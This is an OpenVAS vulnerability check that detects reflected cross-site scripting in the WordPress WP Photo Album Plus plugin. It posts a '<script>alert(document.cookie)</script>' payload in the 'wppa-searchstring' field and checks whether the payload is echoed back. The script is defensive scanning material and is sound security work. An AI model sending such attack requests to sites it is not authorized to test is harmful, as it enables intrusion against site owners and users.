###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_photo_album_plus_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# WordPress WP Photo Album Plus Plugin 'Search Photos' XSS Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the
  context of an affected site when the malicious data is being viewed.
  Impact Level: Application";
tag_affected = "WordPress WP Photo Album Plus Plugin version 4.8.12 and prior";
tag_insight = "Input passed via the 'wppa-searchstring' parameter to index.php
  (when page_id is set to the Search Photos page) is not properly
  sanitised before it is returned to the user.";
tag_solution = "No solution or patch is available as of 31 December, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://wordpress.org/extend/plugins/wp-photo-album-plus/";
tag_summary = "This host is installed with WordPress WP Photo Album Plus Plugin and is
  prone to cross site scripting vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.902698";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-12-31 14:00:10 +0530 (Mon, 31 Dec 2012)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("WordPress WP Photo Album Plus Plugin 'Search Photos' XSS Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://k3170makan.blogspot.in/2012/12/wp-photoplus-xss-csrf-vuln.html");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/119152/wpphotoplussearch-xssxsrf.txt");

  script_description(desc);
  script_summary("Check if WP Photo Album Plus Plugin is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
url = "";
dir = "";
wppaurl = "";
wppaReq = "";
wppaRes = "";
wppaData = "";


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)) exit(0);

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## page_id for WP Photo Album Plus Plugin is 8
wppaurl = dir + "/?page_id=8";

## Construct Post data attack request
wppaData = 'wppa-searchstring=<script>alert(document.cookie)</script>';

## Construct the POST request
wppaReq = string("POST ", wppaurl, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent:  XSS-TEST\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(wppaData), "\r\n",
                 "\r\n", wppaData);

## Send attack and receive the response
wppaRes = http_keepalive_send_recv(port:port, data: wppaReq);

## Confirm exploit worked by checking the response
if(wppaRes && wppaRes =~ "HTTP/1\.[0-9]+ 200" &&
   "<script>alert(document.cookie)</script>" >< wppaRes &&
   "wppaPreviousPhoto" >< wppaRes){
  security_warning(port);
}
